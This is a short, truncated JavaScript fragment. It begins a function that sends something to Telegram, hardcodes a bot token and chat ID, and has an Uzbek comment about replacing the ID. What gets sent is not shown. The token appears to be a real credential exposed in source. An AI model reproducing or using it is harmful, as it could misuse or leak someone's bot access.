...
async function sendToTelegram() {
    const BOT_TOKEN = "8734232448:AAH9hZNoT_XaDtncGx0C2R_WxLsHVJ4C80o";
    const CHAT_ID = "-1003950043393"; // <<-- Shu ID ni bot bergan to'g'ri Kanal/Guruh ID-siga almashtiring
